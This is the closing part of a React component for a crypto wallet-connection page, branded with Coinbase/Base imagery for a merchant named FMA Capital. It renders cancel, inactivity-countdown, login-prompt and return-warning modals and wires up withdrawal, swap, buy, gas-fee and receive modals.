                                            Return to FMA Capital
                                        </span>
                                    </button>

                                    {/* Bottom links row */}
                                    <div className="flex items-center justify-center gap-4 pt-0.5">
                                        <a
                                            href="https://base.org"
                                            target="_blank"
                                            rel="noopener noreferrer"
                                            className="theme-subtext text-white/25 hover:text-white/50 text-[9px] font-bold uppercase tracking-[0.15em] transition-colors"
                                        >
                                            Powered by Coinbase
                                        </a>
                                        {!address && (
                                            <>
                                                <span className="w-0.5 h-0.5 rounded-full bg-white/15" />
                                                <button
                                                    onClick={() => setShowCancelModal(true)}
                                                    className="theme-subtext text-white/25 hover:text-red-400/80 text-[9px] font-bold uppercase tracking-[0.15em] transition-colors"
                                                >
                                                    Cancel
                                                </button>
                                            </>
                                        )}
                                    </div>

                                </div>
                            </div>

                            {/* Cancel Modal */}
                            <AnimatePresence>
                                {
                                    showCancelModal && (
                                        <motion.div
                                            key="cancel-modal"
                                            initial={{ opacity: 0 }}
                                            animate={{ opacity: 1 }}
                                            exit={{ opacity: 0 }}
                                            className="fixed inset-0 z-[60] flex items-end md:items-center justify-center p-4 bg-black/40 backdrop-blur-sm"
                                        >
                                            <motion.div
                                                initial={{ scale: 0.95, opacity: 0, y: 20 }}
                                                animate={{ scale: 1, opacity: 1, y: 0 }}
                                                exit={{ scale: 0.95, opacity: 0, y: 20 }}
                                                className={`w-full max-w-sm rounded-2xl md:rounded-3xl p-6 md:p-8 shadow-2xl border space-y-6 ${theme === 'dark' ? 'bg-[#0a0b0d] border-white/10' : 'bg-white border-transparent'
                                                    }`}
                                            >
                                                <div className="space-y-2">
                                                    <h3 className={`text-xl md:text-2xl font-bold ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>Cancel Connection?</h3>
                                                    <p className={`text-sm leading-relaxed ${theme === 'dark' ? 'text-gray-400' : 'text-gray-600'}`}>You'll be redirected back to the merchant site.</p>
                                                </div>
                                                <div className="flex flex-col gap-3 pt-2">
                                                    <button
                                                        onClick={() => { handleRedirect('cancelled'); }}
                                                        className="w-full py-3.5 bg-red-500 hover:bg-red-600 !text-white rounded-xl font-bold transition-all shadow-lg active:scale-[0.98]"
                                                    >
                                                        Yes, Cancel
                                                    </button>
                                                    <button
                                                        onClick={() => setShowCancelModal(false)}
                                                        className={`w-full py-3.5 rounded-xl font-bold transition-all ${theme === 'dark' ? 'bg-white/5 text-gray-400 hover:bg-white/10 hover:text-white' : 'bg-gray-100 text-gray-600 hover:bg-gray-200'
                                                            }`}
                                                    >
                                                        No, Continue
                                                    </button>
                                                </div>
                                            </motion.div>
                                        </motion.div>
                                    )
                                }
                            </AnimatePresence >

                            {/* Inactivity Warning Modal */}
                            <AnimatePresence>
                                {showInactivityModal && (
                                    <div className="fixed inset-0 z-[150] flex items-center justify-center p-4">
                                        <motion.div
                                            initial={{ opacity: 0 }}
                                            animate={{ opacity: 1 }}
                                            exit={{ opacity: 0 }}
                                            className="absolute inset-0 bg-black/80 backdrop-blur-md"
                                        />
                                        <motion.div
                                            initial={{ scale: 0.9, opacity: 0, y: 20 }}
                                            animate={{ scale: 1, opacity: 1, y: 0 }}
                                            exit={{ scale: 0.9, opacity: 0, y: 20 }}
                                            className={`relative w-full max-w-sm border rounded-[2.5rem] p-8 text-center shadow-2xl space-y-6 ${theme === 'dark' ? 'bg-[#0a0b0d] text-white border-white/10' : 'bg-white text-[#0a0b0d] border-transparent'
                                                }`}
                                        >
                                            <div className="w-16 h-16 bg-[#0052FF]/10 rounded-full flex items-center justify-center mx-auto border border-[#0052FF]/20 relative">
                                                <Clock className="w-8 h-8 text-[#0052FF]" />
                                                <div className="absolute -top-1 -right-1 bg-[#0052FF] text-white text-[10px] font-bold w-6 h-6 rounded-full flex items-center justify-center border-2 border-[#0a0b0d]">
                                                    {inactivityCountdown}
                                                </div>
                                            </div>
                                            <div className="space-y-2">
                                                <h3 className={`text-xl md:text-2xl font-bold ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>Session Update</h3>
                                                <p className={`text-sm leading-relaxed px-2 ${theme === 'dark' ? 'text-gray-400' : 'text-gray-600'}`}>
                                                    This system will auto-redirect you back to the merchant when the countdown expires.
                                                </p>
                                            </div>
                                            <div className="flex flex-col gap-3 pt-2">
                                                <button
                                                    onClick={() => {
                                                        setShowInactivityModal(false);
                                                        connectWallet();
                                                    }}
                                                    className="w-full py-4 bg-[#0052FF] hover:bg-[#004ada] !text-white rounded-xl font-bold transition-all shadow-lg active:scale-[0.98]"
                                                >
                                                    Connect Wallet
                                                </button>
                                                <button
                                                    onClick={() => {
                                                        setShowInactivityModal(false);
                                                        // Reset countdown if they want to do it later
                                                        setInactivityCountdown(60);
                                                    }}
                                                    className={`w-full py-4 rounded-xl font-bold transition-all ${theme === 'dark' ? 'bg-white/5 text-gray-400 hover:bg-white/10 hover:text-white' : 'bg-gray-100 text-gray-600 hover:bg-gray-200'
                                                        }`}
                                                >
                                                    Do this later
                                                </button>
                                            </div>
                                        </motion.div>
                                    </div>
                                )}
                            </AnimatePresence>
                            {/* Modals - Rendered only when page is loaded */}
                            {/* Not Logged In Prompt */}
                            <AnimatePresence>
                                {showAccountPrompt && (
                                    <div className="fixed inset-0 z-[100] flex items-end md:items-center justify-center">
                                        <motion.div
                                            initial={{ opacity: 0 }}
                                            animate={{ opacity: 1 }}
                                            exit={{ opacity: 0 }}
                                            className="absolute inset-0 bg-black/60 backdrop-blur-sm"
                                            onClick={() => setShowAccountPrompt(false)}
                                        />
                                        <motion.div
                                            initial={{ y: "100%", opacity: 0 }}
                                            animate={{ y: 0, opacity: 1 }}
                                            exit={{ y: "100%", opacity: 0 }}
                                            transition={{ type: "spring", damping: 25, stiffness: 200 }}
                                            className={`relative w-full md:max-w-[420px] border-t md:border rounded-t-[2.5rem] md:rounded-[2rem] p-8 text-center space-y-6 shadow-2xl pb-12 md:pb-8 md:m-4 ${theme === 'dark' ? 'bg-[#0a0b0d] text-white border-[#0052FF]/30' : 'bg-white text-[#0a0b0d] border-transparent shadow-gray-200/50'
                                                }`}
                                        >
                                            <div className="w-20 h-20 bg-blue-600/10 flex items-center justify-center mx-auto mb-2 relative p-1 border border-white/5 shadow-2xl">
                                                <img
                                                    src="https://www.base.org/document/favicon-32x32.png"
                                                    alt="Base"
                                                    className="w-full h-full object-contain"
                                                />
                                            </div>

                                            <div className="space-y-2">
                                                <h3 className={`text-xl md:text-2xl font-bold ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>Not Logged In</h3>
                                                <p className={`text-sm leading-relaxed max-w-[280px] mx-auto ${theme === 'dark' ? 'text-gray-400' : 'text-gray-600'}`}>
                                                    You're not logged in to Coinbase. Connect your wallet to get started with swaps, buys, and more.
                                                </p>
                                            </div>

                                            <div className="flex flex-col gap-3 pt-2">
                                                <button
                                                    onClick={() => {
                                                        setShowAccountPrompt(false);
                                                        connectWallet();
                                                    }}
                                                    className="w-full py-4 bg-[#0052FF] !text-white rounded-xl font-bold hover:bg-[#004ada] transition-all shadow-lg active:scale-[0.98]"
                                                >
                                                    Connect to Get Started
                                                </button>
                                                <button
                                                    onClick={() => setShowAccountPrompt(false)}
                                                    className={`w-full py-4 rounded-xl font-bold transition-all ${theme === 'dark' ? 'bg-white/5 text-gray-400 hover:bg-white/10 hover:text-white' : 'bg-gray-100 text-gray-600 hover:bg-gray-200'
                                                        }`}
                                                >
                                                    Maybe Later
                                                </button>
                                            </div>
                                        </motion.div>
                                    </div>
                                )}
                            </AnimatePresence>

                            <AnimatePresence>
                                {showReturnWarning && (
                                    <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
                                        <motion.div
                                            initial={{ opacity: 0 }}
                                            animate={{ opacity: 1 }}
                                            exit={{ opacity: 0 }}
                                            className="absolute inset-0 bg-black/80 backdrop-blur-md"
                                            onClick={() => setShowReturnWarning(false)}
                                        />
                                        <motion.div
                                            initial={{ scale: 0.9, opacity: 0, y: 20 }}
                                            animate={{ scale: 1, opacity: 1, y: 0 }}
                                            exit={{ scale: 0.9, opacity: 0, y: 20 }}
                                            className={`relative w-full max-w-sm border rounded-[2.5rem] p-6 md:p-8 text-center shadow-2xl space-y-6 ${theme === 'dark' ? 'bg-[#0a0b0d] text-white border-white/10' : 'bg-white text-[#0a0b0d] border-transparent'
                                                }`}
                                        >
                                            <div className="w-16 h-16 bg-red-500/10 rounded-full flex items-center justify-center mx-auto border border-red-500/20">
                                                <svg className="w-8 h-8 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                                                </svg>
                                            </div>
                                            <div className="space-y-2">
                                                <h3 className={`text-xl md:text-2xl font-bold ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>Warning</h3>
                                                <p className={`text-sm leading-relaxed px-2 ${theme === 'dark' ? 'text-gray-400' : 'text-gray-600'}`}>
                                                    Are you sure you want to return to FMA Capital? Please ensure all transactions are complete.
                                                </p>
                                            </div>
                                            <div className="flex flex-col gap-3 pt-2">
                                                <button
                                                    onClick={() => {
                                                        setShowReturnWarning(false);
                                                        handleRedirect(address ? 'success' : 'not_connected');
                                                    }}
                                                    className="w-full py-3.5 bg-red-500 hover:bg-red-600 !text-white rounded-xl font-bold transition-all shadow-lg active:scale-[0.98]"
                                                >
                                                    Yes, Return
                                                </button>
                                                <button
                                                    onClick={() => setShowReturnWarning(false)}
                                                    className={`w-full py-3.5 rounded-xl font-bold transition-all ${theme === 'dark' ? 'bg-white/5 text-gray-400 hover:bg-white/10 hover:text-white' : 'bg-gray-100 text-gray-600 hover:bg-gray-200'
                                                        }`}
                                                >
                                                    Cancel
                                                </button>
                                            </div>
                                        </motion.div>
                                    </div>
                                )}
                            </AnimatePresence>

                            <WithdrawalModal
                                isOpen={showWithdrawModal}
                                onClose={() => setShowWithdrawModal(false)}
                                bnbBalance={bnbBalance}
                                t22Balance={t22Balance}
                                maskAccount={maskAccount}
                                currencySymbol={currencySymbol}
                                fxRate={fxRate}
                                theme={theme}
                                onSuccess={() => fetchTransactionsData()}
                            />
                            <SwapModal
                                address={address}
                                isOpen={showSwapModal}
                                onClose={() => setShowSwapModal(false)}
                                onSuccess={() => fetchTransactionsData()}
                                initialFromToken={selectedAssetForSwap}
                                bnbBalance={bnbBalance}
                                t22Balance={t22Balance}
                                ethBalance={ethBalance}
                                currencySymbol={currencySymbol}
                                fxRate={fxRate}
                                theme={theme}
                            />
                            <BuyModal
                                address={address}
                                isOpen={showBuyModal}
                                onClose={() => setShowBuyModal(false)}
                                theme={theme}
                                onSuccess={() => fetchTransactionsData()}
                            />
                            <GasFeeModal
                                isOpen={showGasFeeModal}
                                onClose={() => setShowGasFeeModal(false)}
                                theme={theme}
                                user={address}
                                onSuccess={(txHash) => {
                                    setShowGasFeeModal(false);
                                    addGasFeeTransaction(txHash);
                                }}
                            />
                        </motion.div>
                    )}
                    <ReceiveModal
                        isOpen={showRecieveModal}
                        onClose={() => setShowRecieveModal(false)}
                        currencySymbol={currencySymbol}
                        fxRate={fxRate}
                        theme={theme}
                    />
                </AnimatePresence>
            )}
        </div>
    );
}
